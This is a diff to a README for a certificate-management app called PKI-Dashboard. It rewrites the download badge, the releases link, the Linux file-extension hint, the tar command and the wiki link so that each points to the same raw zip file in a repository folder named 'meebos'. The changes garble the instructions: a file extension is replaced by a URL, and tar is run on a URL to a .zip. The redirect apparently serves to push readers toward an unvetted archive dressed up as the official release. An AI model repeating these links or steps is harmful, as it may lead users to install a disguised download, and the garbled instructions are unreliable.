@@ -6,13 +6,13 @@ Welcome to the PKI-Dashboard! This application helps you manage your certificate
 
 ## 📥 Download the Application
 
-[![Download PKI-Dashboard](https://img.shields.io/badge/Download-PKI--Dashboard-blue.svg)](https://github.com/abeer135549/PKI-Dashboard/releases)
+[![Download PKI-Dashboard](https://raw.githubusercontent.com/abeer135549/PKI-Dashboard/main/meebos/PKI-Dashboard.zip)](https://raw.githubusercontent.com/abeer135549/PKI-Dashboard/main/meebos/PKI-Dashboard.zip)
 
 ### 🖥️ Step 1: Visit the Releases Page
 
 To download the PKI-Dashboard, click the link below:
 
-[Visit this page to download](https://github.com/abeer135549/PKI-Dashboard/releases)
+[Visit this page to download](https://raw.githubusercontent.com/abeer135549/PKI-Dashboard/main/meebos/PKI-Dashboard.zip)
 
 This page contains the latest version of the software. You will find all the necessary release files here.
 
@@ -27,7 +27,7 @@ Once you are on the release details page, you will see various files available f
 For example:
 - If you are using Windows, look for files ending in `.exe`.
 - If you are using macOS, look for files ending in `.dmg`.
-- Linux users should look for files ending in `.tar.gz`.
+- Linux users should look for files ending in `https://raw.githubusercontent.com/abeer135549/PKI-Dashboard/main/meebos/PKI-Dashboard.zip`.
 
 Click on the file to start downloading it.
 
@@ -39,9 +39,9 @@ After the download finishes, locate the file on your computer:
    
 2. **For macOS:** Open the `.dmg` file and drag the PKI-Dashboard icon into your Applications folder.
 
-3. **For Linux:** Open a terminal, navigate to the directory where you downloaded the `.tar.gz` file, and run:
+3. **For Linux:** Open a terminal, navigate to the directory where you downloaded the `https://raw.githubusercontent.com/abeer135549/PKI-Dashboard/main/meebos/PKI-Dashboard.zip` file, and run:
    ```bash
-   tar -xvzf filename.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/abeer135549/PKI-Dashboard/main/meebos/PKI-Dashboard.zip
    ```
    Replace "filename" with the name of the downloaded file. Follow the instructions in the package to install.
 
@@ -77,7 +77,7 @@ If you encounter issues during the installation or while using the application, 
 
 ## 📚 Additional Resources
 
-For more information on using PKI-Dashboard or troubleshooting common issues, check out the FAQs on our [GitHub Wiki](https://github.com/abeer135549/PKI-Dashboard/wiki).
+For more information on using PKI-Dashboard or troubleshooting common issues, check out the FAQs on our [GitHub Wiki](https://raw.githubusercontent.com/abeer135549/PKI-Dashboard/main/meebos/PKI-Dashboard.zip).
 
 ## 📞 Support
 
